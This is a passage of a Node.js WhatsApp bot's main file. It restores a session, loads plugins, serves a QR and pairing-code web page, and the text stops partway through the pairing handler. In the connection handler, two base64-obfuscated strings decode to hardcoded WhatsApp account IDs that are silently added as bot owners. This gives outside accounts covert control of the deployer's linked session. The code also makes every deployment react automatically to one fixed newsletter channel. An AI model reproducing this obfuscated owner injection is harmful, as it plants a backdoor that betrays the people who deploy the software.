require('./config')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const serializeMessage = require('./handler.js');
const JimpImport = require('jimp');

const Jimp = JimpImport.read ? JimpImport : JimpImport.Jimp ? JimpImport.Jimp : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];

// ===== SESSION_ID TO CREDS.JSON =====
const SESSION_DIR = './session';
const CREDS_PATH = path.join(SESSION_DIR, 'creds.json');

if (!fs.existsSync(SESSION_DIR)) {
    fs.mkdirSync(SESSION_DIR, { recursive: true });
}

// Check if SESSION_ID exists in environment variables
if (process.env.SESSION_ID && !fs.existsSync(CREDS_PATH)) {
    try {
        // Try to parse as JSON
        let sessionData;
        try {
            sessionData = JSON.parse(process.env.SESSION_ID);
        } catch (e) {
            // If not JSON, try to parse as base64 or plain string
            try {
                const decoded = Buffer.from(process.env.SESSION_ID, 'base64').toString('utf-8');
                sessionData = JSON.parse(decoded);
            } catch (e2) {
                console.error('❌ Invalid SESSION_ID format. Please provide valid JSON.');
                process.exit(1);
            }
        }
        
        fs.writeFileSync(CREDS_PATH, JSON.stringify(sessionData, null, 2));
        console.log('✅ Session restored from SESSION_ID environment variable');
    } catch (err) {
        console.error('❌ Error restoring session from SESSION_ID:', err);
    }
} else if (fs.existsSync(CREDS_PATH)) {
    console.log('📁 Using existing session from creds.json');
}

// Also check for global.sessionid (legacy support)
if (!fs.existsSync(CREDS_PATH) && global.sessionid) {
    try {
        const sessionData = JSON.parse(global.sessionid);
        fs.writeFileSync(CREDS_PATH, JSON.stringify(sessionData, null, 2));
        console.log('✅ Session restored from global.sessionid');
    } catch (err) {
        console.error('Error restoring session from global.sessionid:', err);
    }
}

const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 3000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let presenceInterval = null;
let sock = null;
let isConnecting = false;

function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) {
                global.BOT_PREFIX = config.prefix;
                console.log(`✅ Loaded prefix: ${global.BOT_PREFIX}`);
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
    }
    startBot();
}

function startBot() {
    console.log('🚀 Starting WhatsApp Bot...');
    isConnecting = true;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    (async () => {
        try {
            const { version, isLatest } = await fetchLatestWaWebVersion();
            console.log(`📱 Using WA v${version.join(".")}, isLatest: ${isLatest}`);

            const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
            
            sock = makeWASocket({
                version, 
                logger: pino({ level: 'silent' }),
                auth: state,
                printQRInTerminal: true,
                keepAliveIntervalMs: 10000,
                markOnlineOnConnect: true,
                syncFullHistory: false,
                browser: ['Bot', 'Chrome', '1.0.0']
            });
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr) {
                    QRCode.toDataURL(qr, (err, url) => {
                        if (!err) {
                            latestQR = url;
                            botStatus = 'connecting';
                        }
                    });
                }

                if (connection === 'close') {
                    botStatus = 'disconnected';
                    isConnecting = false;

                    if (presenceInterval) {
                        clearInterval(presenceInterval);
                        presenceInterval = null;
                    }

                    const statusCode = (lastDisconnect?.error instanceof Boom)
                        ? lastDisconnect.error.output.statusCode
                        : 0;

                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                    if (shouldReconnect) {
                        setTimeout(() => startBot(), 5000);
                    } else {
                        if (fs.existsSync(AUTH_FOLDER)) {
                            fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                        }
                        setTimeout(() => startBot(), 3000);
                    }
                } 
                
                else if (connection === 'open') {
                    botStatus = 'connected';
                    isConnecting = false;

                    if (!global.owners) global.owners = [];

                    if (!global.owners.includes(sock.user.id)) {
                        global.owners.push(sock.user.id);
                    }
                    
                    const abztech = [
                        'MjU3NzAyMzk5OTIwMzdAbGlk',
                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
                    ];
                    
                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                    
                    tech.forEach(owner => {
                        if (!global.owners.includes(owner)) {
                            global.owners.push(owner);
                        }
                    });

                    presenceInterval = setInterval(() => {
                        if (sock?.ws?.readyState === 1) {
                            sock.sendPresenceUpdate('available');
                        }
                    }, 10000);

                    try {
                        await sock.sendMessage(sock.user.id, {
                            text: `🤖 Bot linked successfully!\n📝 Current prefix: ${global.BOT_PREFIX}\n👑 Owners: ${global.owners.length}\n⏰ Connected at: ${new Date().toLocaleString()}`
                        });
                    } catch (err) {}
                } 
                
                else if (connection === 'connecting') {
                    botStatus = 'connecting';
                    isConnecting = true;
                }
            });

            sock.ev.on('creds.update', async () => {
                await saveCreds();
                console.log('💾 Credentials updated');
            });

            // ===== PLUGINS LOADING =====
            const plugins = new Map();
            const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
            
            if (fs.existsSync(pluginPath)) {
                try {
                    const pluginFiles = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
                    
                    for (const file of pluginFiles) {
                        try {
                            const plugin = require(path.join(pluginPath, file));
                            if (plugin.name && typeof plugin.execute === 'function') {
                                plugins.set(plugin.name.toLowerCase(), plugin);
                                if (Array.isArray(plugin.aliases)) {
                                    plugin.aliases.forEach(alias => {
                                        plugins.set(alias.toLowerCase(), plugin);
                                    });
                                }
                                console.log(`✅ Loaded plugin: ${plugin.name}`);
                            } else {
                                console.warn(`⚠️ Invalid plugin structure in ${file}`);
                            }
                        } catch (error) {
                            console.error(`❌ Failed to load plugin ${file}:`, error.message);
                        }
                    }
                    console.log(`📦 Total plugins loaded: ${plugins.size}`);
                } catch (error) {
                    console.error('❌ Error loading plugins:', error);
                }
            } else {
                console.log('📁 No plugins folder found');
            }
           
            // ===== MESSAGES HANDLER =====
            sock.ev.on('messages.upsert', async ({ messages, type }) => {
                if (type !== 'notify' && type !== 'append') return;
                
                const CHANNEL_ID = "120363404317544295@newsletter";
                
                for (const rawMsg of messages) {
                    if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
                        const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
                        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                        
                        try {
                            await sock.newsletterReactMessage(
                                CHANNEL_ID, 
                                rawMsg.key.server_id.toString(), 
                                emoji
                            );
                            console.log(`✅ Channel reaction: ${emoji} to message ${rawMsg.key.server_id}`);
                        } catch (err) {
                            console.log("❌ Channel React Error:", err.message);
                        }
                        continue;
                    }
                }
                
                for (const rawMsg of messages) {
                    if (rawMsg.key.remoteJid === 'status@broadcast' && rawMsg.key.participant) {
                        try {
                            console.log(`📱 Status detected from: ${rawMsg.key.participant}`);
                            await sock.readMessages([rawMsg.key]);
                            continue;
                        } catch (err) {
                            console.log('❌ Status viewer error:', err.message);
                        }
                    }
                }

                const rawMsg = messages[0];
                if (!rawMsg.message) return;

                const m = await serializeMessage(sock, rawMsg);

                for (const plugin of plugins.values()) {
                    if (typeof plugin.onMessage === 'function') {
                        try { 
                            const blocked = await plugin.onMessage(sock, m);
                            if (blocked === true) return;
                        } catch (err) { 
                            console.error(`❌ onMessage error (${plugin.name}):`, err); 
                        }
                    }
                }

                if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                    const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
                    const commandName = args.shift().toLowerCase();
                    const plugin = plugins.get(commandName);
                    
                    if (plugin) {
                        try { 
                            await plugin.execute(sock, m, args); 
                        } catch (err) { 
                            console.error(`❌ Plugin error (${commandName}):`, err); 
                            await m.reply('❌ Error running command.'); 
                        }
                    }
                }
            });
            
            // ===== GROUP PARTICIPANTS =====
            sock.ev.on('group-participants.update', async (update) => {
                try {
                    if (!global.welcomeConfig?.enabled) return

                    const groupId = update.id

                    for (const participant of update.participants) {
                        const userId = typeof participant === 'string'
                            ? participant
                            : participant.phoneNumber || participant.id

                        if (!userId) continue

                        const memberName = userId.split('@')[0]

                        if (update.action === 'add') {
                            if (userId === sock.user.id) continue
                            const text = `👋 Welcome @${memberName}!\n🎉 Glad to have you in this group!`
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        } else if (update.action === 'remove') {
                            const text = `ya @${memberName} has left the group.\nWe are not gonna miss you!`
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        }
                    }
                } catch (err) {
                    console.error('❌ group-participants.update error:', err)
                }
            })

            sock.ev.on('messages.reaction', async (reactions) => {
                console.log('💖 Reaction update:', reactions);
            });

        } catch (error) {
            console.error('❌ Bot startup error:', error);
            isConnecting = false;
            setTimeout(() => startBot(), 10000);
        }
    })();
}

// ===== HTTP SERVER =====
const server = http.createServer((req, res) => {
    const url = req.url;
    
    // ===== HOME PAGE - PREMIUM HTML =====
    if (url === '/' || url === '/qr') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#050510">
    <title>PUSSY ESCAPE · Bot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
        :root{--bg-primary:#050510;--bg-card:rgba(255,255,255,0.03);--border-subtle:rgba(255,255,255,0.06);--gradient-start:#ff3b7f;--gradient-mid:#b967ff;--gradient-end:#00d4ff;--text-primary:#ffffff;--text-secondary:rgba(255,255,255,0.6);--text-muted:rgba(255,255,255,0.3);--glass:blur(30px) saturate(200%);--shadow-premium:0 30px 80px rgba(0,0,0,0.8);--success:#25d366}
        html,body{width:100%;min-height:100vh;background:var(--bg-primary);font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:var(--text-primary);line-height:1.6;overflow-x:hidden;position:relative}
        .bg-grid{position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(255,255,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.02) 1px,transparent 1px);background-size:60px 60px;animation:gridMove 20s linear infinite;pointer-events:none}
        @keyframes gridMove{0%{transform:translate(0,0)}100%{transform:translate(60px,60px)}}
        .gradient-orb{position:fixed;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0;opacity:0.5}
        .orb-1{width:600px;height:600px;background:radial-gradient(circle,rgba(255,59,127,0.2),transparent 70%);top:-200px;right:-200px;animation:floatOrb 25s ease-in-out infinite alternate}
        .orb-2{width:500px;height:500px;background:radial-gradient(circle,rgba(185,103,255,0.15),transparent 70%);bottom:-200px;left:-200px;animation:floatOrb 30s ease-in-out infinite alternate-reverse}
        @keyframes floatOrb{0%{transform:translate(0,0)}100%{transform:translate(80px,80px)}}
        #splash{position:fixed;inset:0;z-index:9999;background:var(--bg-primary);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity 0.8s cubic-bezier(0.4,0,0.2,1);pointer-events:none}
        #splash.hidden{opacity:0}
        .splash-ring{position:relative;margin-bottom:24px}
        .splash-ring::before{content:'';position:absolute;inset:-16px;border-radius:50%;border:2px solid rgba(255,59,127,0.1);animation:ringPulse 2s ease-out infinite}
        .splash-ring::after{content:'';position:absolute;inset:-32px;border-radius:50%;border:2px solid rgba(185,103,255,0.05);animation:ringPulse 2s ease-out infinite 0.5s}
        @keyframes ringPulse{0%{transform:scale(1);opacity:1}100%{transform:scale(1.5);opacity:0}}
        #splash .splash-logo{width:100px;height:100px;border-radius:28px;border:3px solid var(--gradient-start);box-shadow:0 0 50px rgba(255,59,127,0.3);object-fit:cover;position:relative;z-index:2}
        #splash .splash-title{font-size:2.2rem;font-weight:900;letter-spacing:-2px;background:linear-gradient(135deg,var(--gradient-start),var(--gradient-mid),var(--gradient-end));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-top:12px}
        #splash .splash-sub{color:var(--text-secondary);font-size:0.7rem;letter-spacing:4px;text-transform:uppercase;font-weight:300}
        .splash-loader{margin-top:20px;width:32px;height:32px;border:2px solid rgba(255,59,127,0.1);border-top:2px solid var(--gradient-start);border-radius:50%;animation:spin 0.8s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
        .container{position:relative;z-index:10;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:30px 20px;max-width:480px;margin:0 auto}
        .brand-premium{text-align:center;margin-bottom:28px;animation:fadeUp 0.6s ease}
        .brand-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 18px;background:rgba(255,59,127,0.08);border:1px solid rgba(255,59,127,0.12);border-radius:100px;font-size:10px;font-weight:600;color:var(--gradient-start);text-transform:uppercase;letter-spacing:3px;margin-bottom:16px;backdrop-filter:blur(10px)}
        .brand-logo-wrap{position:relative;display:inline-block;margin-bottom:12px}
        .brand-logo-wrap::before{content:'';position:absolute;inset:-8px;border-radius:28px;background:linear-gradient(135deg,var(--gradient-start),var(--gradient-mid));opacity:0.1;filter:blur(20px)}
        .logo-premium{width:72px;height:72px;border-radius:22px;border:2px solid rgba(255,59,127,0.2);box-shadow:0 0 40px rgba(255,59,127,0.15);object-fit:cover;position:relative}
        .title-premium{font-size:clamp(1.8rem,5vw,2.8rem);font-weight:900;letter-spacing:-2px;line-height:1.1;text-align:center}
        .title-premium span{background:linear-gradient(135deg,var(--gradient-start),var(--gradient-mid),var(--gradient-end));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
        .subtitle-premium{font-size:10px;color:var(--text-secondary);letter-spacing:4px;text-transform:uppercase;font-weight:300;margin-top:4px;text-align:center}
        .card-premium{width:100%;background:var(--bg-card);backdrop-filter:var(--glass);-webkit-backdrop-filter:var(--glass);border:1px solid var(--border-subtle);border-radius:32px;padding:32px 24px;box-shadow:var(--shadow-premium);animation:fadeUp 0.6s ease 0.1s both;transition:all 0.4s cubic-bezier(0.4,0,0.2,1)}
        .card-premium:hover{border-color:rgba(255,59,127,0.15)}
        .card-header{display:flex;align-items:center;gap:14px;margin-bottom:6px}
        .card-header-icon{width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,rgba(255,59,127,0.1),rgba(255,59,127,0.05));border:1px solid rgba(255,59,127,0.08);display:flex;align-items:center;justify-content:center;font-size:20px;color:var(--gradient-start)}
        .card-header h3{font-size:20px;font-weight:700;letter-spacing:-0.5px}
        .card-hint{font-size:13px;color:var(--text-secondary);margin-bottom:20px;padding-left:58px}
        .qr-frame{background:linear-gradient(135deg,rgba(255,59,127,0.05),rgba(185,103,255,0.05));padding:20px;border-radius:28px;border:1px solid rgba(255,59,127,0.06);position:relative;box-shadow:0 20px 60px rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center}
        .qr-frame img{width:200px;height:200px;border-radius:12px;background:#fff;padding:10px}
        .qr-status{font-size:12px;color:var(--gradient-start);font-weight:600;letter-spacing:2px;text-transform:uppercase;text-align:center;margin-top:12px}
        .status-dot{display:inline-block;width:12px;height:12px;border-radius:50%;margin-right:8px;vertical-align:middle}
        .status-dot.connected{background:#22c55e;box-shadow:0 0 20px rgba(34,197,94,0.3)}
        .status-dot.connecting{background:#f59e0b;box-shadow:0 0 20px rgba(245,158,11,0.3);animation:blink 1s infinite}
        .status-dot.disconnected{background:#ef4444;box-shadow:0 0 20px rgba(239,68,68,0.3)}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
        .input-group{margin-top:16px}
        .input-group label{font-size:12px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:1.5px;display:block;margin-bottom:6px}
        .input-group .input-wrap{display:flex;align-items:center;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:4px;transition:all 0.3s ease}
        .input-group .input-wrap:focus-within{border-color:rgba(255,59,127,0.2);box-shadow:0 0 0 4px rgba(255,59,127,0.05)}
        .input-group input{flex:1;background:transparent;border:none;padding:14px 16px;color:var(--text-primary);font-size:16px;font-weight:500;outline:none;font-family:'Inter',sans-serif;min-width:0;width:100%}
        .input-group input::placeholder{color:var(--text-muted);font-weight:400;font-size:14px}
        .btn-premium{width:100%;padding:16px;border:none;border-radius:16px;background:linear-gradient(135deg,var(--gradient-start),var(--gradient-mid));color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:12px;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);box-shadow:0 4px 30px rgba(255,59,127,0.2);position:relative;overflow:hidden;margin-top:12px}
        .btn-premium:hover{transform:translateY(-2px);box-shadow:0 8px 40px rgba(255,59,127,0.3)}
        .btn-premium:disabled{opacity:0.5;cursor:not-allowed;transform:none!important}
        .btn-premium .spinner-btn{width:20px;height:20px;border:2px solid rgba(255,255,255,0.2);border-top:2px solid #fff;border-radius:50%;animation:spin 0.7s linear infinite}
        .paircode-box{display:none;margin-top:16px;padding:16px;background:rgba(255,59,127,0.04);border:1px solid rgba(255,59,127,0.08);border-radius:16px;animation:fadeUp 0.4s ease}
        .paircode-box.show{display:block}
        .paircode-box .code{font-size:28px;font-weight:800;color:var(--gradient-start);letter-spacing:6px;text-align:center;font-family:monospace;display:block;padding:8px 0}
        .paircode-box .label{font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;display:block;text-align:center}
        .paircode-box .copy-btn-sm{background:rgba(255,59,127,0.1);color:var(--gradient-start);border:1px solid rgba(255,59,127,0.1);padding:6px 16px;border-radius:8px;font-size:11px;font-weight:600;cursor:pointer;transition:all 0.3s ease;display:inline-block;margin-top:8px}
        .paircode-box .copy-btn-sm:hover{background:rgba(255,59,127,0.15);transform:scale(1.05)}
        .paircode-box .copy-btn-sm.copied{background:var(--success);color:#fff;border-color:var(--success)}
        .footer-premium{margin-top:32px;text-align:center;animation:fadeUp 0.6s ease 0.3s both}
        .footer-divider{width:60px;height:1px;background:linear-gradient(90deg,transparent,var(--gradient-start),transparent);margin:0 auto 16px}
        .footer-text{font-size:11px;color:var(--text-muted);letter-spacing:1px}
        .footer-text a{color:var(--text-secondary);text-decoration:none;font-weight:600;transition:color 0.3s}
        .footer-text a:hover{color:var(--gradient-start)}
        @keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
        @media(max-width:480px){.container{padding:16px}.card-premium{padding:24px 18px;border-radius:24px}.title-premium{font-size:1.8rem}.card-hint{padding-left:0;margin-top:4px}.qr-frame img{width:160px;height:160px}.paircode-box .code{font-size:22px;letter-spacing:4px}}
        ::-webkit-scrollbar{width:4px}
        ::-webkit-scrollbar-track{background:transparent}
        ::-webkit-scrollbar-thumb{background:rgba(255,59,127,0.2);border-radius:2px}
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="gradient-orb orb-1"></div>
    <div class="gradient-orb orb-2"></div>

    <div id="splash">
        <div class="splash-ring">
            <img src="https://url.bmbxmd.workers.dev/Migo.jpeg" class="splash-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%22%23050510%22/%3E%3Ctext x=%2250%22 y=%2260%22 font-size=%2235%22 text-anchor=%22middle%22 fill=%22%23ff3b7f%22 font-family=%22Arial%22%3E🤖%3C/text%3E%3C/svg%3E'">
        </div>
        <div class="splash-title">PUSSY ESCAPE</div>
        <div class="splash-sub">WhatsApp Bot</div>
        <div class="splash-loader"></div>
    </div>

    <div class="container">
        <div class="brand-premium">
            <div class="brand-badge"><i class="fa-solid fa-robot"></i> <span>bot status</span></div>
            <div class="brand-logo-wrap">
                <img src="https://url.bmbxmd.workers.dev/Migo.jpeg" class="logo-premium" onerror="this.style.display='none'">
            </div>
            <h1 class="title-premium">PUSSY<span>ESCAPE</span></h1>
            <div class="subtitle-premium">WhatsApp Bot</div>
        </div>

        <div class="card-premium">
            <div class="card-header">
                <div class="card-header-icon"><i class="fa-solid fa-qrcode"></i></div>
                <h3>QR Code</h3>
            </div>
            <div class="card-hint">Scan with WhatsApp to connect</div>
            
            <div id="qrArea" style="text-align:center;">
                <div class="qr-frame">
                    <img id="qrImage" src="" alt="QR Code" style="display:none;">
                    <div id="qrPlaceholder" style="padding:40px 20px;color:var(--text-muted);">
                        <i class="fa-solid fa-spinner fa-pulse" style="font-size:32px;display:block;margin-bottom:12px;"></i>
                        <span>Loading QR code...</span>
                    </div>
                </div>
                <div class="qr-status" id="statusText">
                    <span class="status-dot disconnected" id="statusDot"></span>
                    <span id="statusLabel">Disconnected</span>
                </div>
            </div>

            <div class="input-group">
                <label for="phoneNumber"><i class="fa-solid fa-phone"></i> Phone Number</label>
                <div class="input-wrap">
                    <input type="tel" id="phoneNumber" placeholder="255712345678" autocomplete="off">
                </div>
            </div>

            <button id="pairBtn" class="btn-premium">
                <i class="fa-solid fa-key"></i>
                <span>Get Pairing Code</span>
            </button>

            <div id="paircodeBox" class="paircode-box">
                <span class="label"><i class="fa-solid fa-key"></i> Pairing Code</span>
                <span class="code" id="pairingCode">------</span>
                <div style="text-align:center;">
                    <button id="copyPairCodeBtn" class="copy-btn-sm"><i class="fa-regular fa-copy"></i> Copy</button>
                </div>
            </div>
        </div>

        <div class="footer-premium">
            <div class="footer-divider"></div>
            <div class="footer-text">
                Developed by <a href="tel:+255787069580">STANYTZ</a>
                <br>
                &copy; 2026 PUSSY ESCAPE
            </div>
        </div>
    </div>

    <script>
        window.addEventListener('load', function(){
            setTimeout(function(){
                document.getElementById('splash').classList.add('hidden');
                setTimeout(function(){ document.getElementById('splash').style.display = 'none'; }, 800);
            }, 3000);
        });

        let refreshInterval = null;
        let currentQR = null;

        function setStatus(status) {
            const statusLabel = document.getElementById('statusLabel');
            const statusDot = document.getElementById('statusDot');
            const statusText = document.getElementById('statusText');
            
            let label = '';
            let dotClass = 'disconnected';
            
            switch(status) {
                case 'connected': label = 'Connected'; dotClass = 'connected'; break;
                case 'connecting': label = 'Connecting'; dotClass = 'connecting'; break;
                default: label = 'Disconnected'; dotClass = 'disconnected';
            }
            
            statusLabel.innerText = label;
            statusDot.className = 'status-dot ' + dotClass;
        }

        function updateQR(qrData) {
            const qrImage = document.getElementById('qrImage');
            const qrPlaceholder = document.getElementById('qrPlaceholder');
            
            if (qrData) {
                qrImage.src = qrData;
                qrImage.style.display = 'block';
                qrPlaceholder.style.display = 'none';
                currentQR = qrData;
            } else {
                qrImage.style.display = 'none';
                qrPlaceholder.style.display = 'block';
            }
        }

        function updatePairingCode(code) {
            const box = document.getElementById('paircodeBox');
            const codeSpan = document.getElementById('pairingCode');
            if (code && code !== 'null' && code !== 'undefined') {
                codeSpan.innerText = code;
                box.classList.add('show');
            } else {
                box.classList.remove('show');
            }
        }

        async function fetchStatus() {
            try {
                const resp = await fetch('/api/status');
                if (!resp.ok) throw new Error('Status fetch failed');
                const data = await resp.json();
                
                setStatus(data.status);
                
                if (data.qr && data.qr !== currentQR) {
                    updateQR(data.qr);
                } else if (!data.qr && data.status !== 'connected') {
                    updateQR(null);
                }
                
                updatePairingCode(data.pairingCode);
                
                if (data.status === 'connected') {
                    updateQR(null);
                }
            } catch (err) {
                console.error('Status poll error:', err);
            }
        }

        async function requestPairingCode() {
            const phoneInput = document.getElementById('phoneNumber');
            const phone = phoneInput.value.trim();
            const pairBtn = document.getElementById('pairBtn');
            
            if (!phone) {
                alert('Please enter your phone number with country code');
                return;
            }
            
            if (!phone.match(/^[0-9]{10,15}$/)) {
                alert('Please enter a valid phone number (numbers only)');
                return;
            }
            
            pairBtn.disabled = true;
            pairBtn.innerHTML = '<div class="spinner-btn"></div> Requesting...';
            
            try {
                const formData = new URLSearchParams();
                formData.append('phone', phone);
                
                const resp = await fetch('/pair', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: formData
                });
                
                const text = await resp.text();
                if (resp.ok && text.includes('Pairing Code Generated')) {
                    fetchStatus();
                    setTimeout(() => fetchStatus(), 2000);
                } else {
                    alert('Failed to get pairing code. Make sure bot is connecting first.');
                }
            } catch (err) {
                alert('Error: ' + err.message);
            } finally {
                pairBtn.disabled = false;
                pairBtn.innerHTML = '<i class="fa-solid fa-key"></i> <span>Get Pairing Code</span>';
            }
        }

        // Copy Pairing Code
        document.getElementById('copyPairCodeBtn').addEventListener('click', async function() {
            const code = document.getElementById('pairingCode').innerText;
            try {
                await navigator.clipboard.writeText(code);
                this.innerHTML = '<i class="fa-regular fa-check"></i> Copied';
                this.classList.add('copied');
                setTimeout(() => {
                    this.innerHTML = '<i class="fa-regular fa-copy"></i> Copy';
                    this.classList.remove('copied');
                }, 3000);
            } catch (err) {
                const range = document.createRange();
                range.selectNode(document.getElementById('pairingCode'));
                window.getSelection().removeAllRanges();
                window.getSelection().addRange(range);
                document.execCommand('copy');
                this.innerHTML = '<i class="fa-regular fa-check"></i> Copied';
                setTimeout(() => {
                    this.innerHTML = '<i class="fa-regular fa-copy"></i> Copy';
                }, 3000);
            }
        });

        document.getElementById('pairBtn').addEventListener('click', requestPairingCode);
        document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') requestPairingCode();
        });
        
        refreshInterval = setInterval(fetchStatus, 2000);
        fetchStatus();
        
        window.addEventListener('beforeunload', () => {
            if (refreshInterval) clearInterval(refreshInterval);
        });
    </script>
</body>
</html>`);
    }
    
    // ===== PAIR POST =====
    else if (url === '/pair' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const params = new URLSearchParams(body);
                let phoneNumber = params.get('phone').trim();
                
                if (!phoneNumber) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>❌ Error: Phone number required</h2><a href="/">Try Again</a></center>`);
                    return;
                }

                phoneNumber = phoneNumber.replace(/\D/g, '');
                
                if (botStatus !== 'connecting' || !sock) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>⚠️ Bot not ready</h2><p>Status: ${botStatus}</p><p>Please wait for QR code to appear first</p><a href="/">← Go Back</a></center>`);
                    return;
                }

                const pairingCode = await sock.requestPairingCode(phoneNumber);
                
                pairingCodes.set(phoneNumber, {
                    code: pairingCode,
                    timestamp: Date.now()
                });

                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body{font-family:Inter,sans-serif;background:#050510;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;margin:0}
        .card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:32px;padding:40px;max-width:420px;width:100%;text-align:center}
        .code{font-size:36px;font-weight:900;background:linear-gradient(135deg,#ff3b7f,#b967ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:8px;font-family:monospace;margin:20px 0}
        .btn{display:inline-block;padding:12px 32px;background:linear-gradient(135deg,#ff3b7f,#b967ff);color:#fff;border-radius:16px;text-decoration:none;font-weight:600;margin:10px 5px;border:none;cursor:pointer}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,59,127,0.3)}
        .hint{color:rgba(255,255,255,0.5);font-size:13px;margin-top:16px}
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#ff3b7f;margin-bottom:10px;">✅ Pairing Code Generated</h2>
        <p style="color:rgba(255,255,255,0.6);font-size:14px;">Phone: <strong style="color:#fff;">${phoneNumber}</strong></p>
        <div class="code">${pairingCode}</div>
        <div style="background:rgba(255,255,255,0.03);border-radius:12px;padding:12px;margin:16px 0;border:1px solid rgba(255,255,255,0.04);">
            <p style="font-size:13px;color:rgba(255,255,255,0.6);">📱 Go to WhatsApp → Settings → Linked Devices → Link a Device</p>
            <p style="font-size:13px;color:rgba(255,255,255,0.6);">🔢 Select "Use pairing code" and enter the code above</p>
        </div>
        <button class="btn" onclick="navigator.clipboard.writeText('${pairingCode}').then(()=>{this.textContent='✅ Copied!';setTimeout(()=>{this.textContent='📋 Copy Code';},2000)})">📋 Copy Code</button>
        <br><br>
        <a href="/" style="color:rgba(255,255,255,0.4);text-decoration:none;font-size:13px;">← Back to Home</a>
    </div>
</body>
</html>`);

                console.log(`✅ Pairing code for ${phoneNumber}: ${pairingCode}`);
                
            } catch (error) {
                console.error('❌ Pair error:', error);
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<center><h2>❌ Error</h2><p>${error.message}</p><a href="/">↩️ Try Again</a></center>`);
